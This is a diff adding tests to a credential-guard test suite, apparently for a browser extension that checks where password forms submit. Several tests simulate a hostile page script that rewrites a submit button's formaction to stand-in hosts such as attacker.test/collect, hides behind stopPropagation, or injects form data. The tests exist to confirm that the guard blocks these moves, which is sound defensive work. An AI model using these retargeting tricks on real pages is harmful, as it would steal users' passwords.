@@ -1756,4 +1756,189 @@ describe("credential_guard", () => {
       expect(mockShowModal).toHaveBeenCalledTimes(2);
     });
   });
+
+  // #1084: requestSubmit re-dispatches a submit the guard lets through, so a page
+  // submit listener runs after the last destination check. The stub models the
+  // browser: submit event, then (if not cancelled) formdata, then the navigation
+  // is planned with whatever destination the form carries at that point.
+  describe("resumed-submit destination binding (#1084)", () => {
+    let stopSpy: ReturnType<typeof vi.fn>;
+    beforeEach(() => {
+      stopSpy = vi.fn();
+      (window as unknown as { stop: unknown }).stop = stopSpy;
+      mockGetRegDomain.mockImplementation((host: string) => host.split(".").slice(-2).join("."));
+    });
+
+    // The guard only trusts the browser's own formdata; dispatchEvent is untrusted.
+    function trustedFormData(formData = new FormData()): Event {
+      const ev = new Event("formdata", { bubbles: true });
+      Object.defineProperty(ev, "isTrusted", { value: true });
+      Object.defineProperty(ev, "formData", { value: formData });
+      return ev;
+    }
+
+    function formWithButton(): { form: HTMLFormElement; btn: HTMLButtonElement; planned: string[]; sent: string[][] } {
+      const form = createPasswordForm("https://example.com/session");
+      form.querySelector("input")?.setAttribute("name", "password");
+      const btn = document.createElement("button");
+      btn.type = "submit";
+      form.appendChild(btn);
+      const planned: string[] = [];
+      const sent: string[][] = [];
+      stubRequestSubmit(
+        form,
+        vi.fn((submitter?: HTMLElement | null) => {
+          const ev = new SubmitEvent("submit", { bubbles: true, cancelable: true, submitter: submitter ?? null });
+          form.dispatchEvent(ev);
+          if (ev.defaultPrevented) return;
+          const fd = new FormData(form);
+          form.dispatchEvent(trustedFormData(fd));
+          const names: string[] = [];
+          fd.forEach((_, k) => names.push(k));
+          sent.push(names);
+          planned.push(submitter?.getAttribute("formaction") ?? form.getAttribute("action") ?? "");
+        }),
+      );
+      return { form, btn, planned, sent };
+    }
+
+    it("lets an unchanged resumed submit through without cancelling it", async () => {
+      mockShowModal.mockResolvedValue("proceed_once");
+      const { form, btn, planned, sent } = formWithButton();
+
+      await dispatchSubmit(form, btn);
+
+      expect(planned).toEqual(["https://example.com/session"]);
+      expect(sent[0]).toContain("password");
+      expect(stopSpy).not.toHaveBeenCalled();
+      expect(mockShowModal).toHaveBeenCalledTimes(1);
+    });
+
+    it("cancels a resumed submit a page listener retargets, then re-checks the new destination", async () => {
+      mockShowModal.mockResolvedValueOnce("proceed_once").mockResolvedValueOnce("cancel");
+      const { form, btn, planned, sent } = formWithButton();
+      let pageRuns = 0;
+      form.addEventListener("submit", () => {
+        pageRuns += 1;
+        btn.setAttribute("formaction", "https://attacker.test/collect");
+      });
+
+      await dispatchSubmit(form, btn);
+      await flushMicrotasks();
+
+      expect(planned).toEqual(["https://attacker.test/collect"]);
+      expect(sent).toEqual([[]]); // #1099: emptied, for a POST stop() cannot cancel
+      expect(stopSpy).toHaveBeenCalledTimes(1); // the planned POST is cancelled
+      expect(mockShowModal).toHaveBeenCalledTimes(2); // re-check prompted for the moved destination
+      expect(pageRuns).toBe(1); // the re-check submit never reached the page listener
+      expect(mockAppendEvent).toHaveBeenCalledWith(
+        expect.objectContaining({ extra: expect.objectContaining({ error: "action_mutated_during_resubmit" }) }),
+      );
+    });
+
+    it("blocks with a toast when the destination moves again after the re-check", async () => {
+      mockShowModal.mockResolvedValue("proceed_once");
+      const { form, btn, planned } = formWithButton();
+      let n = 0;
+      form.addEventListener("submit", () => {
+        n += 1;
+        btn.setAttribute("formaction", `https://attacker${n}.test/collect`);
+      });
+
+      await dispatchSubmit(form, btn);
+      await flushMicrotasks();
+
+      expect(planned).toEqual(["https://attacker1.test/collect", "https://attacker2.test/collect"]);
+      expect(stopSpy).toHaveBeenCalledTimes(2);
+      expect(mockShowModal).toHaveBeenCalledTimes(2); // no third prompt: no loop
+      expect(mockShowToast).toHaveBeenCalledWith(
+        expect.objectContaining({ message: expect.stringContaining("destination changed after the security check") }),
+      );
+    });
+
+    it("still binds a resumed submit a page window-capture listener tries to hide", async () => {
+      // Codex review on #1100: with the guard on document capture, a page window-
+      // capture listener stopped propagation before handleSubmit saw the event.
+      mockShowModal.mockResolvedValueOnce("proceed_once").mockResolvedValueOnce("cancel");
+      const { form, btn, planned } = formWithButton();
+      let pageRuns = 0;
+      const hide = (e: Event): void => {
+        pageRuns += 1;
+        btn.setAttribute("formaction", "https://attacker.test/collect");
+        e.stopPropagation();
+      };
+      window.addEventListener("submit", hide, true);
+      try {
+        await dispatchSubmit(form, btn);
+        await flushMicrotasks();
+      } finally {
+        window.removeEventListener("submit", hide, true);
+      }
+
+      expect(planned).toEqual(["https://attacker.test/collect"]);
+      expect(stopSpy).toHaveBeenCalledTimes(1);
+      expect(mockShowModal).toHaveBeenCalledTimes(2);
+      expect(pageRuns).toBe(1); // only the resumed submit reached the page listener
+    });
+
+    it("hides a moved submission's formdata from page listeners, so none can re-append (#1103 review)", async () => {
+      mockShowModal.mockResolvedValueOnce("proceed_once").mockResolvedValueOnce("cancel");
+      const { form, btn, sent } = formWithButton();
+      form.addEventListener("submit", () => btn.setAttribute("formaction", "https://attacker.test/collect"));
+      let pageFormData = 0;
+      form.addEventListener("formdata", (e) => {
+        pageFormData += 1;
+        (e as FormDataEvent).formData.append("password", "canary");
+      });
+
+      await dispatchSubmit(form, btn);
+      await flushMicrotasks();
+
+      expect(sent).toEqual([[]]);
+      expect(pageFormData).toBe(0);
+      expect(stopSpy).toHaveBeenCalledTimes(1);
+    });
+
+    it("still runs page formdata listeners on an unmoved submission", async () => {
+      mockShowModal.mockResolvedValue("proceed_once");
+      const { form, btn, sent } = formWithButton();
+      let pageFormData = 0;
+      form.addEventListener("formdata", () => (pageFormData += 1));
+
+      await dispatchSubmit(form, btn);
+
+      expect(pageFormData).toBe(1);
+      expect(sent[0]).toContain("password");
+      expect(stopSpy).not.toHaveBeenCalled();
+    });
+
+    it("ignores a page that cancels the resumed submit and builds its own FormData", async () => {
+      mockShowModal.mockResolvedValue("proceed_once");
+      const { form, btn, planned } = formWithButton();
+      form.addEventListener("submit", (e) => {
+        btn.setAttribute("formaction", "https://api.other.test/login");
+        form.dispatchEvent(trustedFormData()); // `new FormData(form)`
+        e.preventDefault(); // SPA: the page sends it with fetch
+      });
+
+      await dispatchSubmit(form, btn);
+      await flushMicrotasks();
+
+      expect(planned).toEqual([]);
+      expect(stopSpy).not.toHaveBeenCalled();
+      expect(mockShowModal).toHaveBeenCalledTimes(1);
+    });
+
+    it("treats a method or target change as a moved destination", async () => {
+      mockShowModal.mockResolvedValueOnce("proceed_once").mockResolvedValueOnce("cancel");
+      const { form, btn } = formWithButton();
+      form.addEventListener("submit", () => btn.setAttribute("formtarget", "_blank"));
+
+      await dispatchSubmit(form, btn);
+      await flushMicrotasks();
+
+      expect(stopSpy).toHaveBeenCalledTimes(1);
+      expect(mockShowModal).toHaveBeenCalledTimes(2);
+    });
+  });
 });
